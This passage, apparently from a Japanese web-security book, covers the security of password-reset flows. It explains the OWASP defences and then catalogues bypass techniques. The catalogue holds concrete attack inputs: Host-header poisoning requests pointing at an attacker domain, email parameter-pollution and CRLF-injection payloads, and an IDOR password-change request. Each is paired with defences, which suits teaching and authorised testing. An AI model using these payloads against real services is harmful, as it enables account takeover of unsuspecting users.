# 第6章 パスワードリセット導線


## パスワードリセットの理論・防御観点

パスワードリセット（「パスワードをお忘れですか」）機能は、通常ログインより攻撃対象として狙われやすい。理由は単純で、ログインフローが強固な認証（多要素認証、レート制限、強力なパスワードポリシー）で守られていても、リセットフローが別実装であることが多く、そこに設計上の抜け穴が生まれやすいからである。攻撃者にとってリセット導線は「ログインを迂回してアカウントを乗っ取る近道」になり得る。本節では、OWASP Forgot Password Cheat SheetとOWASP WSTG（Web Security Testing Guide）のAuthentication Testingセクション（WSTG-ATHN-09）を柱に、リセット機能を安全に設計・実装・テストするための理論を整理する。

### なぜリセット機能が特別な脅威モデルを持つのか

通常のログインでは、攻撃者は「パスワードを知っている」ことを証明しなければならない。しかしリセットフローでは、証明すべきものが「そのメールアドレス／電話番号／秘密の質問の答えにアクセスできること」にすり替わる。つまりリセット機能は、パスワードという第一の認証要素を、メールやSMSという**別のチャネル（側身元確認: side-channel）**に一時的に委譲する仕組みである。

この委譲がある限り、次の3種類の弱点が生まれやすい。

1. **委譲先チャネルの検証が甘い**（例: トークンを推測可能、有効期限が長すぎる、使い回しができる）
2. **委譲の事実そのものが情報漏洩を起こす**（ユーザー列挙: アカウントの存在有無がレスポンスの違いから分かってしまう）
3. **委譲後の後処理が甘い**（パスワードを変更しても、攻撃者が乗っ取った既存セッションが生き続ける）

OWASP WSTG-ATHN-09は、テスト対象を次の3点に整理している。

> "1. if users, other than administrators, can change or reset passwords for accounts other than their own. 2. if users can manipulate or subvert the password change or reset process to change or reset the password of another user or administrator. 3. if the password change or reset process is vulnerable to CSRF."

> 出典: OWASP WSTG - Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09) — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html

つまり防御側は「リセット機能は自分のアカウントの範囲だけで完結しているか」「途中に他人の情報を注入・改変できる余地はないか」「CSRFのような受動的攻撃で第三者に強制実行させられないか」の3軸で設計をレビューする必要がある。

### ユーザー列挙（Account Enumeration）とその防ぎ方

最初の関門は「パスワードをお忘れですか」フォームそのものである。ユーザーがメールアドレスやユーザー名を入力した直後のレスポンスが、存在するアカウントと存在しないアカウントで異なると、攻撃者はそのレスポンスの違いを使って有効なアカウント一覧を効率的に洗い出せる（ユーザー列挙攻撃）。これは後続のパスワードスプレー攻撃（少数の弱いパスワードを大量アカウントに試す攻撃）やフィッシングの前段階偵察として悪用される。

OWASP Forgot Password Cheat Sheetは明確にこう述べる。

```
- Return a consistent message for both existent and non-existent accounts.
- Ensure that the time taken for the user response message is uniform.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

**なぜ「メッセージの一貫性」だけでなく「応答時間の一貫性」まで求められるのか。** これはタイミング攻撃（timing attack、処理にかかる時間の差から内部状態を推測する攻撃）への対策である。仮に画面上の文言を「登録されていればメールを送信しました」で統一しても、内部実装が

```
if user_exists(email):
    generate_token()
    send_email()   # DB書き込み + SMTP送信 + トークン生成コストがかかる
return "登録されていればメールを送信しました"
```

のように「存在する場合だけ重い処理を実行してから返す」書き方だと、存在するアカウントの方がレスポンスが数十〜数百ミリ秒遅くなる。攻撃者はこの時間差を統計的に測定し、大量のメールアドレスに対して機械的にアカウントの有無を判定できてしまう。したがって、Cheat Sheetが推奨するように非同期処理（レスポンスを即座に返し、実際のメール送信はバックグラウンドキューで行う）にするか、存在しない場合でも「存在する場合と同じ処理コスト」をダミーで踏ませる実装が必要になる。

さらにCheat Sheetは、単純な文言統一だけでなく、リセット申請自体への**レート制限**も要求している。

```
Implement protections against excessive automated submissions such as
rate-limiting on a per-account basis, requiring a CAPTCHA, or other
controls. Otherwise an attacker could make thousands of password reset
requests per hour for a given account, flooding the user's intake
system (e.g., email inbox or SMS) with useless requests.
```

これは「同じメールアドレスに対して大量のリセットメールを送りつけ、正規ユーザーの受信箱を埋め尽くす」攻撃（メール爆撃／MFA疲労攻撃の亜種）への対策である。アカウント単位のレート制限（例: 同一アカウントへのリセット要求は1時間に3回まで）に加え、送信元IP単位のレート制限も併用しないと、攻撃者は複数アカウントに対して横断的に大量送信を行える点に注意する。

### アカウントロックアウトを「リセット拒否の武器」にしてはいけない

意外に見落とされがちな点として、Cheat Sheetは次のように明記している。

```
Do not make a change to the account until a valid token is presented,
such as locking out the account.
```

そしてAccount Lockoutの節では、

```
Accounts should not be locked out in response to a forgotten password
attack, as this can be used to deny access to users with known
usernames.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

**これがなぜ重要か。** もし「パスワードリセットを複数回要求したアカウントは一時ロックする」という実装にすると、攻撃者はユーザー名さえ知っていれば、そのユーザー名に対して繰り返しリセット要求を送るだけで正規ユーザーをロックアウトできてしまう（サービス拒否攻撃、DoS）。つまりロックアウトという「一見安全に見える防御策」が、逆に可用性攻撃の踏み台になる。防御すべきはロックアウトではなく、前述のレート制限（要求頻度を減衰・遅延させる）であり、両者は似て非なるものだと理解する必要がある。

### リセットトークン設計の原理

トークンはリセットフローの心臓部であり、以下の性質を満たす必要がある。Cheat Sheetの要求を引用する。

```
All tokens and codes should be:
- Generated using a cryptographically secure random number generator.
- Long enough to protect against brute-force attacks.
- Linked to an individual user in the database.
- Invalidated after they have been used.
- Stored in a secure manner, as discussed in the Password Storage Cheat Sheet.
```

それぞれの理由を仕組みレベルで見ていく。

**暗号学的に安全な乱数生成器（CSPRNG）を使う理由**: `Math.random()`（JavaScript）や多くの言語の標準乱数関数は、内部でメルセンヌ・ツイスタのような予測可能なアルゴリズムを使っている。これらは統計的品質は高いが「暗号学的な予測不可能性」は保証しない。つまり過去に出力された値の一部が分かれば、内部状態を復元して将来の出力を予測できる場合がある。トークン生成には`secrets.token_urlsafe()`（Python）や`crypto.randomBytes()`（Node.js）のようなCSPRNGを使う必要がある。

```python
# 悪い例: 予測可能な乱数源
import random
token = str(random.randint(100000, 999999))

# 良い例: CSPRNG
import secrets
token = secrets.token_urlsafe(32)  # URLセーフな32バイト(256bit)相当のトークン
```

**十分な長さが必要な理由**: トークンはブルートフォース（総当たり）攻撃の対象になる。6桁の数値PIN（100万通り）は、レート制限がなければ数分〜数時間で全数探索可能である。一方、256ビット相当のランダムトークンは事実上探索不可能な空間になる。ここで「トークンの長さ」と「試行回数を制限するレート制限」は補完関係にある点が重要で、どちらか一方だけでは不十分である——短いPINでもレート制限が強ければ実用上安全になり得るし（SMSのPINはこの設計）、逆に長いトークンでもレート制限がなければ理論上は探索され得る余地が生まれる（実運用上は非現実的な時間がかかるため通常は問題にならないが、防御の層は重ねるべきという原則）。

**個々のユーザーとひも付ける理由**: トークン単体を検証するのではなく「このトークンはこのユーザーIDに対して発行されたものか」を照合する必要がある。これを怠ると、トークンとユーザーIDをリクエストパラメータとして別々に受け取る実装で、攻撃者が自分に発行された有効なトークンと、被害者のユーザーID（あるいはメールアドレス）を組み合わせて送信し、被害者のパスワードを変更できてしまう危険がある（WSTG-ATHN-09が指摘する「User ID Validation」の欠如）。

**使用後は無効化する理由**: ワンタイムであるべきトークンが再利用可能だと、メールがどこかに残っている限り（共有PC、転送履歴、漏洩したメールボックスなど）何度でもパスワードを変更できてしまう。トークンは「発行→1回だけ使用可→即座に無効化」というライフサイクルで管理する。

**安全に保管する理由**: トークンをデータベースに平文で保存すると、DBが漏洩した際にすべての未使用トークンがそのまま悪用可能になる。パスワードと同様にハッシュ化して保存し、検証時に入力されたトークンをハッシュ化して比較する設計が望ましい（Password Storage Cheat Sheetの手法を準用）。

### URLトークン方式とHost Headerインジェクション

最も一般的な実装は、メールでリセットURLを送る方式である。Cheat Sheetは手順を次のように示す。

```
1. Generate a token for the user and attach it in the URL query string.
2. Send this token to the user via email.
   - Don't rely on the Host header while creating the reset URLs to
     avoid Host Header Injection attacks. The URL should either be
     hard-coded, or validated against a list of trusted domains.
   - Ensure that the URL is using HTTPS.
3. The user receives the email, and browses to the URL with the
   attached token.
   - Ensure that the reset password page adds the Referrer Policy tag
   with the noreferrer value in order to avoid referrer leakage.
   - Implement appropriate protection to prevent users from
     brute-forcing tokens in the URL, such as rate limiting.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

**Host Headerインジェクションがなぜ起こるか、仕組みレベルで説明する。** 多くのWebフレームワークは、絶対URLを組み立てる際にリクエストの`Host`ヘッダーをそのまま信頼して使う機能を持つ（例: Djangoの`request.build_absolute_uri()`、PHPの`$_SERVER['HTTP_HOST']`）。しかし`Host`ヘッダーはクライアントが自由に書き換えられるリクエストヘッダーの一つに過ぎない。攻撃者が次のようなリクエストを送るとする。

```
POST /forgot-password HTTP/1.1
Host: attacker-controlled.example
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

サーバー側が「パスワードリセットURLを組み立てる際にHostヘッダーを使う」実装だった場合、被害者に送られるメール本文のリンクが

```
https://attacker-controlled.example/reset?token=<有効なトークン>
```

のように、攻撃者のドメインを指すURLになってしまう。被害者がこのリンクをクリックすると、有効なトークンが攻撃者のサーバーへのリクエストとしてログに残る（Refererヘッダー経由、あるいはURL自体がアクセスされることで）。攻撃者はそのトークンを盗み取り、正規のリセットページで使ってアカウントを乗っ取れる。

対策は「メール本文に埋め込むURLのドメイン部分は、リクエストのHostヘッダーから動的に組み立てず、サーバー設定にハードコードするか、許可リストに照合してから使う」ことである。

```python
# 悪い例: Hostヘッダーを信頼
reset_url = f"https://{request.headers['Host']}/reset?token={token}"

# 良い例: 設定値を使う（Hostヘッダーは一切参照しない）
ALLOWED_BASE_URL = "https://app.example.com"
reset_url = f"{ALLOWED_BASE_URL}/reset?token={token}"
```

**Referrer Policyがなぜ必要か。** リセットページを開いてから「新しいパスワードを設定する」ボタンを押すまでの間に、ページ内に外部リソース（画像、広告、外部フォント、トラッキングスクリプトなど）への参照があると、ブラウザはデフォルトでRefererヘッダーに遷移元の完全なURLを含めて送信する。もしリセットページのURL自体にトークンがクエリ文字列として含まれていた場合（`https://app.example.com/reset?token=abcdef123...`）、このRefererヘッダーを通じてトークンが外部の第三者サーバーに漏洩してしまう。`Referrer-Policy: no-referrer`をリセットページのレスポンスヘッダーに設定することで、この漏洩経路を遮断できる。

```
Referrer-Policy: no-referrer
```

なお、根本的な設計としては「トークンをURLのクエリ文字列に置かず、リンククリック後にPOSTボディで送らせる（=リセットページはトークン入りURLを表示せず、確認後にサーバー側セッションと紐付けたPOSTで消費する）」設計や、「メールリンクのクリックで即座にトークンを消費し、以降は別途発行した短命セッションIDでフォームを完結させる」設計も広く使われる。Cheat Sheetはこの発想を次のように補足している。

```
Note: URL tokens can follow on the same behavior of the PINs by
creating a restricted session from the token.
```

つまり、URLトークンをクリックした瞬間に「パスワード変更のみ許可する制限付きセッション」を発行し、以降のやり取りはそのセッションで行う、という多層防御が推奨されている。

### PIN方式とその特有の留意点

SMSなどのチャネルでは、URLの代わりに数字PINを送る実装も一般的である。

```
1. Generate a PIN.
2. Send it to the user via SMS or another mechanism.
   - Breaking the PIN up with spaces makes it easier for the user to
     read and enter.
3. The user then enters the PIN along with their username on the
   password reset page.
4. Create a limited session from that PIN that only permits the user
   to reset their password.
5. Let the user create a new password and confirm it.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

PIN方式はURLトークンよりも桁数が少ない（6〜12桁）分、ブルートフォース耐性は本質的に低い。この弱点を補うのが手順4の「制限付きセッション」で、PINを入力させるフォーム自体に強いレート制限（例: 5回誤入力でロック、指数バックオフ）とCAPTCHAを組み合わせることが実質的な防御になる。**なぜ「トークンを長くする」のではなく「レート制限で補う」設計が許容されるのか**——SMSはユーザー体験上、長い文字列を手入力させるのに適さないチャネルだからである。ここは「エントロピー（推測困難性）を運用制御（試行回数制限）で補う」というトレードオフの典型例であり、脅威モデル次第でどちらの比重を高めるか判断する。

### 秘密の質問（Security Questions）はなぜ単独の認証手段にできないのか

Cheat SheetとWSTG-ATHN-09は共に、秘密の質問を単独のリセット手段として使うことを明確に否定している。

```
Security questions should not be used as the sole mechanism for
resetting passwords due to their answers frequently being easily
guessable or obtainable by attackers.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

WSTG側も同様に、メールへの依存とのトレードオフを含めて論じている。

```
The first step is to check whether secret questions are required.
Sending the password (or a password reset link) to the user email
address without first asking for a secret question means relying
100% on the security of that email address, which is not suitable if
the application needs a high level of security.
```

> 出典: OWASP WSTG - Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09) — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html

**なぜ「母親の旧姓」「初めて飼ったペットの名前」のような質問が弱いのか。** これらの答えは、SNSの公開プロフィールや過去の投稿、公的記録、あるいはソーシャルエンジニアリング（電話や対面で聞き出す手口）によって、パスワードよりもはるかに容易に第三者へ漏れる性質を持つ。つまり秘密の質問は「知識ベース認証」ではあるものの、その知識のエントロピー（=推測される確率の低さ）が著しく低く、パスワード相当の強度を持たない。結論として、秘密の質問を使う場合でも、必ずメールやSMSといった所有物ベースの確認（そのメールボックス／電話を物理的に所持していること）と併用し、単独では成立しないフローに設計すべきである。

### リセット完了後の後処理: セッション無効化と通知

パスワードが変更された後の処理を怠ると、せっかくトークンやレート制限で守ったフローの効果が無に帰す。Cheat Sheetの指摘を見る。

```
- Send the user an email informing them that their password has been
  reset (do not send the password in the email!).
- Once they have set their new password, the user should then login
  through the usual mechanism. Don't automatically log the user in, as
  this introduces additional complexity to the authentication and
  session handling code, and increases the likelihood of introducing
  vulnerabilities.
- Ask the user if they want to invalidate all of their existing
  sessions, or invalidate the sessions automatically.
```

> 出典: OWASP Forgot Password Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

**「リセット後に自動ログインさせない」ことがなぜ推奨されるのか。** 一見ユーザー体験としては「リセットしたらそのままログインできた方が親切」に思える。しかしOWASPが指摘する通り、これは認証・セッション管理コードに新しい分岐（=通常ログインとは別のセッション発行経路）を追加することを意味し、その分岐にだけ存在するバグ（例: MFAチェックをスキップしてしまう、セッション固定化対策を経由し忘れる）が生まれるリスクが増す。攻撃対象領域（アタックサーフェス）を増やさないために、リセット後は「通常のログインフローに一本化して、そこを改めて通過させる」方が安全側に倒せる。

**既存セッションの無効化がなぜ必須か。** 攻撃者が何らかの方法で既にセッションを乗っ取っていた場合（セッションハイジャック、XSSによるCookie窃取など）、被害者がパスワードをリセットしても、攻撃者側の既存セッションがそのまま有効であれば意味がない。パスワード変更をトリガーに、サーバー側に保存されているセッションストアから該当ユーザーの全セッション（あるいは変更元のセッション以外の全セッション）を無効化する処理を必ず組み込む。これは「パスワードを変更した」というイベントを、単なるDBのフィールド更新で終わらせず、認可の再評価ポイントとして扱う設計思想である。

```python
def complete_password_reset(user_id, new_password, current_session_id):
    update_password_hash(user_id, hash_password(new_password))
    # 変更操作を行った現在のセッション以外、全て無効化
    invalidate_all_sessions(user_id, except_session=current_session_id)
    send_notification_email(user_id, "パスワードが変更されました")
```

**通知メールになぜパスワード自体を書いてはいけないか。** これはWSTG-ATHN-09が「Summary」で指摘する問題意識とも重なる。

```
When passwords are reset they are either rendered within the
application or emailed to the user. This may indicate that the
passwords are stored in plain text or in a decryptable format.
```

パスワードを平文でメール本文に書けるということは、サーバー側がそのパスワードを平文または復号可能な形で保持している証拠であり、それ自体が設計上の重大な欠陥（本来はハッシュ化して一方向にしか変換できない状態で保存すべき）を意味する。仮にメール自体が盗聴・傍受されなくても、「メールサーバーのログや転送履歴にパスワード平文が残る」というだけで攻撃対象領域が拡大する。したがって通知メールは「変更されたという事実」だけを伝え、パスワードそのものを含めてはならない。

### 変更の確認とトークンの取り消し猶予（DoS耐性）

WSTG-ATHN-09は、パスワードリセットが「即座に確定」する設計自体がサービス拒否（DoS）攻撃に使われうる点を強調している。

```
Is the reset password functionality requesting confirmation before
changing the password?

To limit denial-of-service attacks the application should email a
link to the user with a random token, and only if the user visits the
link then the reset procedure is completed. This ensures that the
current password will still be valid until the reset has been
confirmed.
```

> 出典: OWASP WSTG - Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09) — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html

**仕組みを噛み砕くと**: もし「リセット申請フォームを送信した時点」で即座にパスワードが変更されてしまう（あるいは旧パスワードが即座に無効化される）実装だと、攻撃者は被害者のメールアドレスやユーザー名を知っているだけで、被害者のログインを妨害し続けられる。何度でもリセット申請を送りつければ、正規ユーザーが自分の(旧)パスワードでログインしようとしても常に失敗する状態を作れてしまう。これを防ぐのが「確認ステップの分離」で、リセット申請とパスワード変更の確定を2段階に分け、確定操作（メール内のリンクへのアクセス、あるいはトークンの提出）が行われるまでは旧パスワードを有効なまま維持する。これにより、攻撃者がリセットを何度申請しても、被害者本人がリンクをクリックしない限り実害が発生しない。

### パスワード変更（Change Password）機能との違いと共通する脅威

ここまでは「パスワードを忘れた場合のリセット」（未認証状態からの回復）を扱ってきたが、ログイン済みユーザーが能動的にパスワードを変更する「パスワード変更」機能にも共通する脅威がある。WSTG-ATHN-09は次のように述べる。

```
Is the old password requested to complete the change?

The most insecure scenario here is if the application permits the
change of the password without requesting the current password.
Indeed if an attacker is able to take control of a valid session they
could easily change the victim's password.
```

> 出典: OWASP WSTG - Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09) — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html

**なぜ現在のパスワードの再入力を要求するのか。** セッションCookieやトークンを何らかの手段（XSS、共有端末での放置、CSRF）で窃取・悪用された場合でも、「現在のパスワード」という追加の知識要素を要求することで、攻撃者がセッションだけを持っていても完全な乗っ取り（=パスワード変更によって正規ユーザーを締め出す）まではできないようにする、という多層防御である。これは「センシティブな操作の前に再認証を求める」パターン（re-authentication for sensitive actions）の一種であり、WSTGのRemediationでも次のように総括されている。

```
The password change or reset function is a sensitive function and
requires some form of protection, such as requiring users to
re-authenticate or presenting the user with confirmation screens
during the process.
```

さらにWSTGは、CSRFへの耐性もこの文脈で明示的に求めている。パスワード変更フォームにCSRFトークンによる保護がない場合、攻撃者は被害者を悪意あるページへ誘導し、被害者のブラウザに(被害者が既にログイン中のセッションCookieを使って)「パスワードを攻撃者が指定した値に変更する」リクエストを自動送信させることができる。現在のパスワードの再入力要求は、実質的にCSRF対策としても機能する（攻撃者は被害者の現在のパスワードを知らないため、CSRFで強制送信しても成功しない）が、これはあくまで副次的効果であり、CSRFトークンによる保護を代替するものではない点に注意する。

### 多要素認証(MFA)とリセットフローの関係

MFAを導入していても、リセットフローがMFAを迂回できる設計になっていれば、MFAは意味を成さない。WSTG-ATHN-09の指摘を一般化すると、「パスワード変更・リセットのフローは、通常のログインと少なくとも同等の強度を持ち、MFAをバイパスしてはならない」という原則が導かれる。具体的には、MFAを有効化しているユーザーがパスワードリセットを行った直後に、MFAの再設定なしにログインできてしまう実装や、リセット完了と同時にMFA登録済みデバイスの検証をスキップしてセッションを発行してしまう実装は危険である。MFAのリセット自体を扱う手順は、OWASP Multifactor Authentication Cheat Sheetの「Resetting MFA」で別途詳細に扱われており、パスワードリセットとMFAリセットは異なる強度の本人確認を要求すべきという設計思想が背景にある。

### まとめ: 防御チェックリスト

本節で扱った内容を、実装レビュー時に確認すべき観点として整理する。

- リセット申請フォームのレスポンス（メッセージ・応答時間）は、アカウントの存在有無で差が出ないか
- リセット申請・トークン検証の双方に、アカウント単位／IP単位のレート制限があるか
- リセット申請の繰り返しでアカウントがロックされる実装になっていないか（DoSの温床）
- トークンはCSPRNGで生成され、十分な長さを持ち、ユーザーIDに紐付き、使用後は無効化され、保存時はハッシュ化されているか
- リセットURLのドメイン部分をHostヘッダーから動的に組み立てていないか(ハードコードまたは許可リスト照合)
- リセットページにReferrer-Policy: no-referrerが設定されているか
- 秘密の質問を単独のリセット手段にしていないか
- リセット確定は2段階(申請→リンク/トークン提出による確定)になっており、確定まで旧パスワードが有効か
- リセット完了後、既存セッションを無効化しているか(自動または選択式)
- 通知メールにパスワード自体を含めていないか
- リセット完了後、自動ログインさせず通常のログインフローに一本化しているか
- パスワード変更機能(ログイン済み状態)は現在のパスワードの再入力とCSRF対策を備えているか
- リセット・変更フローがMFAをバイパスしない設計になっているか

これらはいずれも単独の「バグ」ではなく、リセット機能が持つ「認証チャネルの一時的な委譲」という本質的な脅威モデルから導かれる系統的な要件である。実装レビューやペネトレーションテストの際は、個々のチェック項目を機械的に確認するだけでなく、「このフローはどの認証チャネルに何を委ねているか、そのチャネルの信頼性はどう担保されているか」という視点で全体を俯瞰することが、抜け漏れのない防御設計につながる。

## リセット導線バイパス手法カタログ

パスワードリセット機能は「未認証のユーザーに、正規のアカウント所有者だけが知り得る証拠（メール受信箱・SMS受信・秘密の質問など）を示させ、その証拠と引き換えに認証済みの操作（パスワード変更）を許可する」という、認証フロー全体の中でも最も攻撃対象になりやすい部分である。理由は単純で、通常のログインと違って「未認証の状態から強い権限（パスワード変更）に到達する」逆転構造を持つためだ。本節では、HackTricksの `reset-password` ページと PayloadsAllTheThings の `Account Takeover` カタログを軸に、実務で遭遇するリセット導線のバイパス手法を、原理（なぜ成立するか）とセットで整理する。

以降のペイロード・リクエスト例はすべて防御目的の検証観点で提示するものであり、実在サービスや本番環境への無許可の実行は行わないこと。自分が管理するテスト環境またはスコープが明示されたバグバウンティ対象でのみ検証する。

### 1. トークンの「輸送経路」で漏れる問題

パスワードリセットの核心は「秘密のトークン（推測不可能なランダム値）を、正規の受信者だけに届ける」ことにある。輸送経路のどこかにトークンが漏れる隙があれば、トークン自体がどれだけ強くても意味がない。

#### 1.1 Referrerヘッダ経由のトークン漏洩

リセットリンクが `https://example.com/reset?token=XXXX` のようにトークンをURLクエリに直接埋め込む場合、そのページ内に外部サイトへのリンク（広告、SNS共有ボタン、フォントCDNなど）があると、ブラウザは遷移時に `Referer` ヘッダへ現在のURL（トークンを含む）をそのまま載せて送信してしまう。

**検証手順**:
1. 自分宛にパスワードリセットをリクエストする。
2. 受信したリセットリンクをクリックするが、パスワードは変更しない。
3. そのページ内から外部サイト（Twitter/Facebookの共有ボタンなど）へ遷移する。
4. Burp Suiteでその遷移リクエストを傍受し、`Referer` ヘッダにトークンが含まれていないか確認する。

含まれていれば、トークンはアクセスログや第三者の解析ツール（外部サイトの分析基盤など）にも記録され得る。これは典型的な「秘密情報をURLに置いてはいけない」問題の一種で、URLは（1)ブラウザ履歴、(2)Referrerヘッダ、(3)プロキシ/サーバーのアクセスログ、(4)ブラウザ拡張機能、という複数の経路で漏洩し得るという原理に基づく。

**防御**: トークンをURLクエリパラメータではなくPOSTボディやワンタイムのセッション紐付けで扱う、`Referrer-Policy: no-referrer` または `same-origin` を設定する、リセットページ内の外部リンクを最小化する。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 1.2 パスワードリセット投毒（Host Header Poisoning）

多くのアプリケーションは、リセットメール本文中のリンクを組み立てる際、サーバー側の絶対URLを `Host` ヘッダ（あるいは `X-Forwarded-Host`、`Forwarded` など、リバースプロキシ経由で利用されるヘッダ）から動的に生成する。これは「複数ドメイン・複数環境で同じコードを使い回せる」利便性のために行われることが多いが、`Host` ヘッダはクライアントが完全に制御できる入力値であるため、攻撃者はこれを自分のドメインに書き換えることで、被害者に送られるリセットリンクの発行元自体を差し替えられる。

```http
POST /reset.php HTTP/1.1
Host: attacker.domain.tld
X-Forwarded-Host: attacker.domain.tld
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

サーバーが `$_SERVER['HTTP_HOST']`（PHPの例）のようにリクエストヘッダ由来の値でリセットURLのオリジンを組み立てていると、被害者に届くメールのリンクが `https://attacker.domain.tld/reset?token=XXXX` のような形になり、被害者が正規のメールだと信じてクリックすると、トークンが攻撃者サーバーへのリクエストとして送信されてしまう。攻撃者はそのアクセスログからトークンを回収し、正規のドメインでリセットを完了させて乗っ取る。

```php
// 脆弱: リクエストヘッダ由来の値でオリジンを構築
$base = "https://" . $_SERVER['HTTP_HOST'];

// 改善: サーバー設定の固定値、またはホワイトリストで検証したHostのみ許可
$base = "https://" . $_SERVER['SERVER_NAME']; // なお SERVER_NAME もリバースプロキシ構成次第では信頼できない場合がある
```

検証時は `baseurl`、`return_to`、`redirect_uri` といったパラメータも同様のポイズニングが効くか確認し、初回のリセットリクエストだけでなく「リンク再送信」エンドポイントもテストする。

**防御**: リセットリンクのオリジンはサーバー側の固定設定値（環境変数など）から生成し、リクエストヘッダを信頼しない。リバースプロキシ構成で `Host` を書き換える場合は、許可されたホスト名のホワイトリストで検証してから通す。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

### 2. 宛先（受信者）を操作する問題

トークンの輸送経路が正しくても、「誰にそのトークンを送るか」を決めるロジックに不備があれば、攻撃者は被害者宛のトークンを自分の受信箱にも届けさせられる。

#### 2.1 メールパラメータの多重指定・注入

リクエストの `email` パラメータを複数指定できてしまう、あるいはCRLF（キャリッジリターン+ラインフィード、ヘッダの区切り文字）を注入できてしまうと、被害者宛のメールに攻撃者アドレスをCC/BCCとして紛れ込ませたり、配列として複数の宛先を渡せてしまうことがある。バックエンドのメール送信ライブラリが、想定外の配列やパラメータ汚染（HTTP Parameter Pollution）に対して「最初の値だけ使う」「最後の値だけ使う」「全部使う」のいずれの挙動を取るかはフレームワーク依存であり、この不一致が悪用の余地になる。

```
# 方法1: 同名パラメータの重複指定（Parameter Pollution）
email=victim@email.com&email=attacker@email.com

# 方法2: 区切り文字の混入
email=victim@email.com%20email=attacker@email.com
email=victim@email.com|email=attacker@email.com

# 方法3: CRLF注入によるCC/BCC追加
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"

# 方法4: JSON配列としての送信
{"email":["victim@mail.tld","attacker@mail.tld"]}

# 方法5: フレームワーク固有の配列記法
email[]=victim@mail.tld&email[]=attacker@mail.tld
```

これらが成立する原理は、サーバー側の入力検証が「単一の文字列」を前提に書かれている一方、HTTPパーサやテンプレートエンジン、メールライブラリはより緩い形式（配列、複数値）を受け付けてしまう不整合にある。特にメール送信処理がユーザー入力を検証なしにヘッダ文字列へそのまま連結している場合、CRLF注入によって任意のメールヘッダ（`Cc:`、`Bcc:` など）を追加され得る、いわゆるメールヘッダインジェクションの一種でもある。

**防御**: 単一の文字列型を期待するパラメータで配列・複数値が渡された場合は明示的に拒否する。メール送信直前に値を単一の文字列型へキャストし直し、改行文字を除去・拒否する。信頼できるメールライブラリのAPI（生ヘッダ文字列を組み立てない方式）を使う。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md
> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 2.2 APIパラメータのIDOR（他ユーザーの識別子を直接指定）

「パスワード変更」APIが、ログイン中のセッションからユーザーを特定するのではなく、リクエストボディ中の `email` や `user_id` から対象ユーザーを特定していると、攻撃者は自分のセッションでログインしたまま、ボディの値だけを被害者のものに差し替えて送信できる。これはIDOR（Insecure Direct Object Reference、直接オブジェクト参照の権限検証漏れ）の典型形で、「誰が」ではなく「何を対象にするか」をクライアントの申告に任せてしまう設計ミスである。

```http
POST /api/changepass HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"email":"victim@email.tld","password":"12345678"}
```

**防御**: 対象ユーザーはサーバー側のセッション/トークンから一意に決定し、リクエストボディの識別子は無視するか、セッションの主体と一致することを検証する。加えてパスワード変更操作には現在のパスワードの再確認や、直近のリセットトークンの提示を必須にする多層防御が望ましい。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

#### 2.3 ユーザー名の空白・大小文字衝突

ユーザー名にトリムされていない空白文字を許可していると、`"admin"` と `"admin "`（末尾スペース）が内部的には別レコードとして保存されつつ、比較ロジック（表示・検索・パスワードリセットの照合など）では同一視されてしまうケースがある。攻撃者は末尾スペース付きのユーザー名で新規登録し、そのアカウントに対するパスワードリセットトークンを取得したうえで、比較ロジックの不整合を突いて被害者アカウントのパスワードを書き換える。

**実際のCVE**: CTFdプラットフォームで報告されたCVE-2020-7245がこの類型に該当する。ユーザー名比較における空白文字の扱いの不整合を突いて、既存ユーザーになりすましたパスワードリセットが可能だった。

**防御**: ユーザー名は登録時に正規化（トリム、大小文字統一、連続空白の圧縮）してから保存・比較する。データベースの一意制約も正規化後の値に対してかける。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

#### 2.4 Unicode正規化によるなりすまし登録

